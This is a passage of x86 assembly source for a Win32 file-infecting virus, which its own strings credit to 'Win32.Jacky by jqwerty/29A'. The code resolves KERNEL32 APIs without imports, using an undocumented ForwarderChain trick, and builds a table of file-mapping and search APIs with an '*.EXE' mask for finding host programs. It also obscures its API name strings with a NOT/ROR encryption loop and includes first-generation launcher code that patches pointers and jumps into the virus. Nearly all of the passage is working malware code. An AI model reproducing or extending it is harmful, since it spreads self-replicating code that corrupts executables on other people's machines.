        mov     edx,ebx                 ;get address of exported API functions
        add     edx,[ebp.ED_AddressOfFunctions]
        add     ebx,[edx+eax*4]         ;get address of requested API function
        mov     eax,ebx
        sub     ebx,ebp                 ;take care of forwarded API functions
        cmp     ebx,ecx
        jb      Proc_Address_not_found

End_GetProcAddressET:

        mov     [esp.Pushad_ecx],eax    ;set requested Proc Address, if found
        popad
        ret     (2*Pshd)

GetProcAddressET endp

MyGetProcAddressK32:  ;this function is simply a wraper to the GetProcAddress
                      ;  API. It retrieves the address of an API function
                      ;  exported from KERNEL32.
                      ;on entry:
                      ;  TOS+04h (Arg1): pszAPIname (pointer to API name)
                      ;  TOS+00h (return adress)
                      ;on exit:
                      ;  ECX = API function address
                      ;  ECX = 0, if not found


        pop     eax
        push    dword ptr [ebp + K32Mod - v_end]    ;KERNEL32 module handle
        push    eax

MyGetProcAddress proc

        mov     ecx,12345678h       ;this dynamic variable will hold an RVA
ddGetProcAddress = dword ptr $ - 4  ;pointer to the GetProcAddress API in
                                    ;the IAT
gotoGetProcAddressET:

        jecxz   GetProcAddressET
        push    [esp.Arg2]
        push    [esp.(Pshd).Arg1]
        add     ecx,[ebp + phost_hdr - v_end]
        call    [ecx]               ;call the original GetProcAddress API
        xchg    ecx,eax
        jecxz   gotoGetProcAddressET  ;if error, call my own GetProcAddress
        ret     (2*Pshd)              ;function

MyGetProcAddress endp

MyGetModuleHandleA proc ;this function retrieves the base address/module
                        ;handle of a DLL module previosly loaded to memory.
        pop     ecx
        pop     eax
        push    ecx
        mov     edx,[ebp + phost_hdr - v_end]
        mov     ecx,12345678h        ;this dynamic variable will hold an RVA
ddGetModuleHandleA = dword ptr $ - 4 ;pointer to the GetModuleHandleA API in
        jecxz   check_K32            ;the IAT

GetModHandleA:

        push    eax
        call    [ecx + edx]     ;call the original GetModuleHandleA API
        xor     ecx,ecx
        jmp     really_PE?

check_K32:

        mov     eax,[edx + 12345678h]   ;this dynamic variable will hold an
                                        ;RVA pointer to the ForwarderChain
                                        ;field in the KERNEL32 import
                                        ;descriptor. This is an undocumented
ptrForwarderChain = dword ptr $ - 4     ;feature to get the K32 base address
        inc     eax
        jz      End_GetModHandleA       ;make sure the base address is ok
        dec     eax
        jz      End_GetModHandleA
        cmp     eax,12345678h           ;this dynamic variable will hold the
                                        ;prev.contents of the ForwarderChain
                                        ;field in the K32 import descriptor
ddForwarderChain = dword ptr $ - 4      ;if they match, then the Win32 loader
        jz      End_GetModHandleA       ;didnt copy the K32 base address

really_PE?:

        cmp     word ptr [eax],IMAGE_DOS_SIGNATURE  ;make sure its the base
        jnz     End_GetModHandleA                   ;address of a PE module
        mov     edx,[eax.MZ_lfanew]
        cmp     dword ptr [eax + edx],IMAGE_NT_SIGNATURE
        jnz     End_GetModHandleA
        xchg    ecx,eax
        
End_GetModHandleA:

        ret

MyGetModuleHandleA endp

align 4         ;set dword alignment

v_end:

;uninitialized data     ;these variablez will be addressed in memory, but
                        ;dont waste space in the file

pv_start                dd      ?       ;pointer to virus start in memory
phost_hdr               dd      ?       ;ptr to the host base address in mem
K32Mod                  dd      ?       ;KERNEL32 base address

FunctionAddressez:      ;these variables will hold the API function addressez
                        ;used in the virus

ddCreateFileA           dd      ?
ddCreateFileMappingA    dd      ?
ddCloseHandle           dd      ?
ddUnmapViewOfFile       dd      ?
ddMapViewOfFile         dd      ?
ddFindFirstFileA        dd      ?
ddFindNextFileA         dd      ?
ddFindClose             dd      ?
ddSetFileAttributesA    dd      ?
ddSetFilePointer        dd      ?
ddSetEndOfFile          dd      ?
ddSetFileTime           dd      ?

v_stringz:              ;the API names used by the virus are decrypted here

vszKernel32             db      'KERNEL32',0
vszGetModuleHandleA     db      'GetModuleHandleA',0
vszGetProcAddress       db      'GetProcAddress',0

EXE_filez               db      '*.EXE',0       ;the file mask

FunctionNamez:

vszCreateFileA          db      'CreateFileA',0
vszCreateFileMappingA   db      'CreateFileMappingA',0
vszCloseHandle          db      'CloseHandle',0
vszUnmapViewOfFile      db      'UnmapViewOfFile',0
vszMapViewOfFile        db      'MapViewOfFile',0
vszFindFirstFileA       db      'FindFirstFileA',0
vszFindNextFileA        db      'FindNextFileA',0
vszFindClose            db      'FindClose',0
vszSetFileAttributesA   db      'SetFileAttributesA',0
vszSetFilePointer       db      'SetFilePointer',0
vszSetEndOfFile         db      'SetEndOfFile',0
vszSetFileTime          db      'SetFileTime',0

EndOfFunctionNames      db      0

align 4

FindData        WIN32_FIND_DATA ?

virtual_end:

first_generation:   ;this routine will be called only once from the first
                    ;generation sample, it simply initializes some variables
                    ;needed in the very first run.
jumps
        push    NULL
        call    GetModuleHandleA
        test    eax,eax
        jz      exit_host
        xchg    ecx,eax
        call    here
here:   pop     ebx

        mov     eax,ebx
        sub     eax,here - v_start
        sub     eax,ecx
        neg     eax
        mov     [ebx + delta_host - here],eax   ;set delta host value

        mov     eax,ebx
        sub     eax,here - host
        sub     eax,ecx
        neg     eax
        mov     [ebx + phost_start_rva - here],eax      ;set pointer to
                                                        ;host's base adress
        mov     eax,[ebx + pfnGMH - here]
        .if     word ptr [eax] == 25FFh         ; JMP [nnnnnnnn]
        mov     eax,[eax + 2]
        .endif
        sub     eax,ecx
        mov     [ebx + ddGetModuleHandleA - here],eax   ;set GetModuleHandleA
                                                        ;RVA pointer
        mov     eax,[ebx + pfnGPA - here]
        .if     word ptr [eax] == 25FFh         ; JMP [nnnnnnnn]
        mov     eax,[eax + 2]
        .endif
        sub     eax,ecx
        mov     [ebx + ddGetProcAddress - here],eax     ;set GetProcAddress
                                                        ;RVA pointer
        pushad                  ;encrypt unencrypted API namez and other
                                ;stringz
        cld
        mov     ecx,ve_string_size
        lea     esi,[ebx + ve_stringz - here]
        mov     edi,esi
        call    crypt_back
        popad
        jmp     v_start         ;ok, here we go.. jump to virus start..

crypt_back:                     ;encryption routine

        lodsb
        not     al
        ror     al,cl
        stosb
        loop    crypt_back
        ret

pfnGMH  dd      offset GetModuleHandleA
pfnGPA  dd      offset GetProcAddress

;Host code starts here

extrn   MessageBoxA: proc
extrn   ExitProcess: proc

host:                   ;here begins the original host code

;Display Message box

        push    MB_OK
        @pushsz "(c) Win32.Jacky by jqwerty/29A"
        @pushsz "First generation sample"
        push    NULL
        call    MessageBoxA

;Exit host

exit_host:

        push    0
        call    ExitProcess

        end     first_generation





